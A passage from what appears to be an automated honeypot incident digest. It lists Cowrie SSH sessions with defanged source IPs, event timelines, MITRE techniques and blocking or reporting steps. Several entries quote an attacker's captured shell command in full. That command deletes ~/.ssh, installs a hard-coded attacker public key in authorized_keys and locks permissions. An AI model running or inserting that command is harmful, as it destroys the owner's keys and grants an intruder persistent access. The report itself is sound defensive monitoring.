| **Last Seen** | 2026-07-03 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:20:13` | `cowrie.session.connect` |
| `2026-07-03 06:20:13` | `cowrie.client.version` |
| `2026-07-03 06:20:13` | `cowrie.client.kex` |
| `2026-07-03 06:20:14` | `cowrie.login.success` |
| `2026-07-03 06:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95efd5697d06

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-03 06:20 |
| **Last Seen** | 2026-07-03 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:20:15` | `cowrie.session.connect` |
| `2026-07-03 06:20:15` | `cowrie.client.version` |
| `2026-07-03 06:20:15` | `cowrie.client.kex` |
| `2026-07-03 06:20:16` | `cowrie.login.success` |
| `2026-07-03 06:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fea42d7e2d33

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-07-03 06:23 |
| **Last Seen** | 2026-07-03 06:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:23:48` | `cowrie.session.connect` |
| `2026-07-03 06:23:48` | `cowrie.client.version` |
| `2026-07-03 06:23:48` | `cowrie.client.kex` |
| `2026-07-03 06:23:49` | `cowrie.login.success` |
| `2026-07-03 06:23:50` | `cowrie.session.params` |
| `2026-07-03 06:23:50` | `cowrie.command.input` |
| `2026-07-03 06:23:50` | `cowrie.command.failed` |
| `2026-07-03 06:23:51` | `cowrie.log.closed` |
| `2026-07-03 06:23:54` | `cowrie.session.params` |
| `2026-07-03 06:23:54` | `cowrie.command.input` |
| `2026-07-03 06:23:54` | `cowrie.session.file_download` |
| `2026-07-03 06:23:54` | `cowrie.log.closed` |
| `2026-07-03 06:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55ecd5230395

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-07-03 06:23 |
| **Last Seen** | 2026-07-03 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:23:54` | `cowrie.session.connect` |
| `2026-07-03 06:23:54` | `cowrie.client.version` |
| `2026-07-03 06:23:54` | `cowrie.client.kex` |
| `2026-07-03 06:23:55` | `cowrie.login.success` |
| `2026-07-03 06:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f4151d1a23

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-07-03 06:23 |
| **Last Seen** | 2026-07-03 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:23:55` | `cowrie.session.connect` |
| `2026-07-03 06:23:55` | `cowrie.client.version` |
| `2026-07-03 06:23:55` | `cowrie.client.kex` |
| `2026-07-03 06:23:56` | `cowrie.login.success` |
| `2026-07-03 06:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78640b7dc4f1

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]244` |
| **First Seen** | 2026-07-03 06:24 |
| **Last Seen** | 2026-07-03 06:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:24:56` | `cowrie.session.connect` |
| `2026-07-03 06:24:56` | `cowrie.client.version` |
| `2026-07-03 06:24:57` | `cowrie.client.kex` |
| `2026-07-03 06:24:58` | `cowrie.login.success` |
| `2026-07-03 06:24:59` | `cowrie.session.params` |
| `2026-07-03 06:24:59` | `cowrie.command.input` |
| `2026-07-03 06:24:59` | `cowrie.command.failed` |
| `2026-07-03 06:25:00` | `cowrie.log.closed` |
| `2026-07-03 06:25:02` | `cowrie.session.params` |
| `2026-07-03 06:25:02` | `cowrie.command.input` |
| `2026-07-03 06:25:02` | `cowrie.session.file_download` |
| `2026-07-03 06:25:02` | `cowrie.log.closed` |
| `2026-07-03 06:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87288187b3b6

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]244` |
| **First Seen** | 2026-07-03 06:25 |
| **Last Seen** | 2026-07-03 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:25:03` | `cowrie.session.connect` |
| `2026-07-03 06:25:03` | `cowrie.client.version` |
| `2026-07-03 06:25:03` | `cowrie.client.kex` |
| `2026-07-03 06:25:04` | `cowrie.login.success` |
| `2026-07-03 06:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56e0d62550f

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]244` |
| **First Seen** | 2026-07-03 06:25 |
| **Last Seen** | 2026-07-03 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:25:04` | `cowrie.session.connect` |
| `2026-07-03 06:25:04` | `cowrie.client.version` |
| `2026-07-03 06:25:05` | `cowrie.client.kex` |
| `2026-07-03 06:25:06` | `cowrie.login.success` |
| `2026-07-03 06:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0962a0def30a

| Field | Detail |
|---|---|
| **Source IP** | `95.165.77[.]31` |
| **First Seen** | 2026-07-03 06:27 |
| **Last Seen** | 2026-07-03 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:27:28` | `cowrie.session.connect` |
| `2026-07-03 06:27:28` | `cowrie.client.version` |
| `2026-07-03 06:27:28` | `cowrie.client.kex` |
| `2026-07-03 06:27:29` | `cowrie.login.success` |
| `2026-07-03 06:27:30` | `cowrie.session.params` |
| `2026-07-03 06:27:30` | `cowrie.command.input` |
| `2026-07-03 06:27:30` | `cowrie.command.failed` |
| `2026-07-03 06:27:30` | `cowrie.log.closed` |
| `2026-07-03 06:27:30` | `cowrie.session.params` |
| `2026-07-03 06:27:30` | `cowrie.command.input` |
| `2026-07-03 06:27:31` | `cowrie.session.file_download` |
| `2026-07-03 06:27:31` | `cowrie.log.closed` |
| `2026-07-03 06:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.77[.]31` to AbuseIPDB if not already reported
- [ ] Block `95.165.77[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020315e7ee95

| Field | Detail |
|---|---|
| **Source IP** | `95.165.77[.]31` |
| **First Seen** | 2026-07-03 06:27 |
| **Last Seen** | 2026-07-03 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:27:31` | `cowrie.session.connect` |
| `2026-07-03 06:27:31` | `cowrie.client.version` |
| `2026-07-03 06:27:31` | `cowrie.client.kex` |
| `2026-07-03 06:27:31` | `cowrie.login.success` |
| `2026-07-03 06:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.77[.]31` to AbuseIPDB if not already reported
- [ ] Block `95.165.77[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b2a03996980

| Field | Detail |
|---|---|
| **Source IP** | `95.165.77[.]31` |
| **First Seen** | 2026-07-03 06:27 |
| **Last Seen** | 2026-07-03 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:27:32` | `cowrie.session.connect` |
| `2026-07-03 06:27:32` | `cowrie.client.version` |
| `2026-07-03 06:27:32` | `cowrie.client.kex` |
| `2026-07-03 06:27:32` | `cowrie.login.success` |
| `2026-07-03 06:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.77[.]31` to AbuseIPDB if not already reported
- [ ] Block `95.165.77[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e419383214

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 06:29 |
| **Last Seen** | 2026-07-03 06:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:29:00` | `cowrie.session.connect` |
| `2026-07-03 06:29:01` | `cowrie.client.version` |
| `2026-07-03 06:29:01` | `cowrie.client.kex` |
| `2026-07-03 06:29:06` | `cowrie.login.success` |
| `2026-07-03 06:29:10` | `cowrie.session.params` |
| `2026-07-03 06:29:10` | `cowrie.command.input` |
| `2026-07-03 06:29:11` | `cowrie.log.closed` |
| `2026-07-03 06:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fef75bb03e8

| Field | Detail |
|---|---|
| **Source IP** | `178.185.136[.]57` |
| **First Seen** | 2026-07-03 06:29 |
| **Last Seen** | 2026-07-03 06:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:29:13` | `cowrie.session.connect` |
| `2026-07-03 06:29:13` | `cowrie.client.version` |
| `2026-07-03 06:29:13` | `cowrie.client.kex` |
| `2026-07-03 06:29:14` | `cowrie.login.success` |
| `2026-07-03 06:29:15` | `cowrie.session.params` |
| `2026-07-03 06:29:15` | `cowrie.command.input` |
| `2026-07-03 06:29:15` | `cowrie.command.failed` |
| `2026-07-03 06:29:15` | `cowrie.log.closed` |
| `2026-07-03 06:29:15` | `cowrie.session.params` |
| `2026-07-03 06:29:15` | `cowrie.command.input` |
| `2026-07-03 06:29:16` | `cowrie.session.file_download` |
| `2026-07-03 06:29:16` | `cowrie.log.closed` |
| `2026-07-03 06:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.185.136[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.185.136[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a30543a23d1

| Field | Detail |
|---|---|
| **Source IP** | `178.185.136[.]57` |
| **First Seen** | 2026-07-03 06:29 |
| **Last Seen** | 2026-07-03 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:29:16` | `cowrie.session.connect` |
| `2026-07-03 06:29:16` | `cowrie.client.version` |
| `2026-07-03 06:29:16` | `cowrie.client.kex` |
| `2026-07-03 06:29:17` | `cowrie.login.success` |
| `2026-07-03 06:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.185.136[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.185.136[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30e5c1cc35a

| Field | Detail |
|---|---|
| **Source IP** | `178.185.136[.]57` |
| **First Seen** | 2026-07-03 06:29 |
| **Last Seen** | 2026-07-03 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:29:17` | `cowrie.session.connect` |
| `2026-07-03 06:29:17` | `cowrie.client.version` |
| `2026-07-03 06:29:17` | `cowrie.client.kex` |
| `2026-07-03 06:29:18` | `cowrie.login.success` |
| `2026-07-03 06:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.185.136[.]57` to AbuseIPDB if not already reported
- [ ] Block `178.185.136[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ac45307dbd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 06:29 |
| **Last Seen** | 2026-07-03 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:29:18` | `cowrie.session.connect` |
| `2026-07-03 06:29:18` | `cowrie.client.version` |
| `2026-07-03 06:29:18` | `cowrie.client.kex` |
| `2026-07-03 06:29:19` | `cowrie.login.success` |
| `2026-07-03 06:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ee3204d4541

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 06:29 |
| **Last Seen** | 2026-07-03 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:29:18` | `cowrie.session.connect` |
| `2026-07-03 06:29:18` | `cowrie.client.version` |
| `2026-07-03 06:29:18` | `cowrie.client.kex` |
| `2026-07-03 06:29:19` | `cowrie.login.success` |
| `2026-07-03 06:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b947b4511c1

| Field | Detail |
|---|---|
| **Source IP** | `178.128.1[.]119` |
| **First Seen** | 2026-07-03 06:31 |
| **Last Seen** | 2026-07-03 06:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:31:20` | `cowrie.session.connect` |
| `2026-07-03 06:31:20` | `cowrie.client.version` |
| `2026-07-03 06:31:20` | `cowrie.client.kex` |
| `2026-07-03 06:31:20` | `cowrie.login.success` |
| `2026-07-03 06:31:21` | `cowrie.session.params` |
| `2026-07-03 06:31:21` | `cowrie.command.input` |
| `2026-07-03 06:31:21` | `cowrie.command.failed` |
| `2026-07-03 06:31:21` | `cowrie.log.closed` |
| `2026-07-03 06:31:22` | `cowrie.session.params` |
| `2026-07-03 06:31:22` | `cowrie.command.input` |
| `2026-07-03 06:31:22` | `cowrie.session.file_download` |
| `2026-07-03 06:31:22` | `cowrie.log.closed` |
| `2026-07-03 06:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.1[.]119` to AbuseIPDB if not already reported
- [ ] Block `178.128.1[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3704544e82bf

| Field | Detail |
|---|---|
| **Source IP** | `178.128.1[.]119` |
| **First Seen** | 2026-07-03 06:31 |
| **Last Seen** | 2026-07-03 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:31:22` | `cowrie.session.connect` |
| `2026-07-03 06:31:22` | `cowrie.client.version` |
| `2026-07-03 06:31:22` | `cowrie.client.kex` |
| `2026-07-03 06:31:22` | `cowrie.login.success` |
| `2026-07-03 06:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.1[.]119` to AbuseIPDB if not already reported
- [ ] Block `178.128.1[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be17e4b7f13d

| Field | Detail |
|---|---|
| **Source IP** | `178.128.1[.]119` |
| **First Seen** | 2026-07-03 06:31 |
| **Last Seen** | 2026-07-03 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:31:22` | `cowrie.session.connect` |
| `2026-07-03 06:31:22` | `cowrie.client.version` |
| `2026-07-03 06:31:22` | `cowrie.client.kex` |
| `2026-07-03 06:31:23` | `cowrie.login.success` |
| `2026-07-03 06:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.1[.]119` to AbuseIPDB if not already reported
- [ ] Block `178.128.1[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087f46ad3d82

| Field | Detail |
|---|---|
| **Source IP** | `125.31.2[.]160` |
| **First Seen** | 2026-07-03 06:35 |
| **Last Seen** | 2026-07-03 06:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:35:21` | `cowrie.session.connect` |
| `2026-07-03 06:35:21` | `cowrie.client.version` |
| `2026-07-03 06:35:22` | `cowrie.client.kex` |
| `2026-07-03 06:35:23` | `cowrie.login.success` |
| `2026-07-03 06:35:24` | `cowrie.session.params` |
| `2026-07-03 06:35:24` | `cowrie.command.input` |
| `2026-07-03 06:35:24` | `cowrie.command.failed` |
| `2026-07-03 06:35:24` | `cowrie.log.closed` |
| `2026-07-03 06:35:25` | `cowrie.session.params` |
| `2026-07-03 06:35:25` | `cowrie.command.input` |
| `2026-07-03 06:35:25` | `cowrie.session.file_download` |
| `2026-07-03 06:35:25` | `cowrie.log.closed` |
| `2026-07-03 06:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.31.2[.]160` to AbuseIPDB if not already reported
- [ ] Block `125.31.2[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a407d776d0

| Field | Detail |
|---|---|
| **Source IP** | `125.31.2[.]160` |
| **First Seen** | 2026-07-03 06:35 |
| **Last Seen** | 2026-07-03 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:35:25` | `cowrie.session.connect` |
